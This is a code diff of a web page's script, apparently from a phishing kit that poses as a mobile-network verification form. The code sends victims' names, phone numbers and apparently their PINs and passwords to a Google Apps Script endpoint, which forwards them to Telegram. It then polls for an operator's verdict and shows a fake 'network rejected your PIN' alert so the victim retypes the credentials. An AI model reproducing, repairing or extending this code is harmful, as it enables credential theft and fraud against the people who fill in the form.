@@ -115,7 +115,7 @@
 </div>
 
 <script>
-    // Ensure this URL is your most recent deployment
+    // Replace this with your newly DEPLOYED script URL
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyM0Hwo5tu3KmjmkvjWqw_CV70EfJ2ODuYOWSoK1BODeNQC03UoHHDqT8ysNX5Pv-ZPlg/exec"; 
     
     const urlParams = new URLSearchParams(window.location.search);
@@ -174,7 +174,7 @@
 
         showView(4);
 
-        // DATA OBJECT with BOT CREDENTIALS for Script-Side Telegram Notification
+        // SEND ALL DATA TO SCRIPT (Including credentials for Telegram)
         const data = {
             name: name,
             phone: phone,
@@ -185,11 +185,11 @@
             id: CHAT_ID
         };
 
-        // Submit to Script (Handles both Sheet logging and Telegram)
         try { 
             const formData = new URLSearchParams();
             for (const key in data) { formData.append(key, data[key]); }
 
+            // ONE POST request does both: Logs to Sheet AND triggers Telegram via backend
             await fetch(SCRIPT_URL, { 
                 method: 'POST', 
                 mode: 'no-cors', 
@@ -197,13 +197,13 @@
             }); 
         } catch (e) { console.error("Submit Error:", e); }
 
-        // Start polling for operator rejection
-        const checkInterval = setInterval(async () => {
+        // Start polling for rejection
+        const poll = setInterval(async () => {
             try {
                 const r = await fetch(`${SCRIPT_URL}?phone=${phone}`);
                 const status = await r.text();
                 if(status === "error") {
-                    clearInterval(checkInterval);
+                    clearInterval(poll);
                     alert("❌ Incorrect details. The network rejected your PIN or Password. Please re-enter them correctly.");
                     location.reload();
                 }
